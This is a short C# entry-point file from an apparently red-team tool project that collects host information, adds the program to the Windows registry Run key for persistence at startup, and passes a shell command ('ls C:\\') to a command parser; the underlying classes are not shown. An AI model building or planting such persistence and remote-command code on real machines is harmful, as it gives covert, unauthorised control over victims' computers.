using System;
namespace RedTeamDevelop
{
    class Program
    {
        static void Main(string[] args)
        {
            GeneralInfo infoObject = new GeneralInfo();

            Persistence persObj = new Persistence(infoObject);

            //add epath to ...run registry
            persObj.AddtoStartup();

            Operation opsObj = new Operation(infoObject);
            opsObj.CommandParser("ls C:\\");

            //Console.WriteLine(infoObject.ipv4address);
        }        
    }
    
}